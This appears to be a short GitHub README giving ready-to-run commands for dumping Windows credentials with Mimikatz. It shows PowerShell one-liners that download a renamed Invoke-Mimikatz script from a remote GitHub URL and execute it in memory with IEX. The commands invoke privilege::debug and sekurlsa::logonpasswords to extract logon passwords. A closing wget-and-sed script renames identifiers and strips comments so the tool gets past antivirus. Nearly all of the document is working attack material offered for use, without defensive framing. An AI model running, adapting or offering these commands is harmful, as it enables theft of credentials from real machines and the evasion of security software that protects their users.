# Download Mimikatz web with Powershell

mimikatz 2.1.1 (x64) built on Aug  3 2018

OK for Win 10 (v1803)

Powershell as Administrator

    Import-Module .\Invoke-Mimidogz.ps1
    Invoke-Mimikatz -Command "privilege::debug"

or via web:

    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mttstt/mimi/master/Invoke-Mimidogz.ps1');Invoke-Mimidogz -Command "privilege::debug" 

https://github.com/gentilkiwi/mimikatz/issues/83

Autentication proxy for powershell
(New-Object System.Net.WebClient).Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials


IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/mttstt/mimi/master/Kingdom3.ps1");Invoke-Mimidogz -Com
mand "privilege::debug";Invoke-Mimidogz -command "sekurlsa::logonpasswords"

# Script to obfuscate mimikatz and bypass AV
    
    wget https://raw.githubusercontent.com/EmpireProject/Empire/7a39a55f127b1aeb951b3d9d80c6dc64500cacb5/data/module_source/credentials/Invoke-Mimikatz.ps1
    sed -i -e 's/Invoke-Mimikatz/Invoke-Mimidogz/g' Invoke-Mimikatz.ps1
    sed -i -e '/<#/,/#>/c\\' Invoke-Mimikatz.ps1
    sed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Mimikatz.ps1
    sed -i -e 's/DumpCreds/DumpCred/g' Invoke-Mimikatz.ps1
    sed -i -e 's/ArgumentPtr/NotTodayPal/g' Invoke-Mimikatz.ps1
    sed -i -e 's/CallDllMainSC1/ThisIsNotTheStringYouAreLookingFor/g' Invoke-Mimikatz.ps1
    sed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions \$Win32Functions #\-/g" Invoke-Mimikatz.ps1
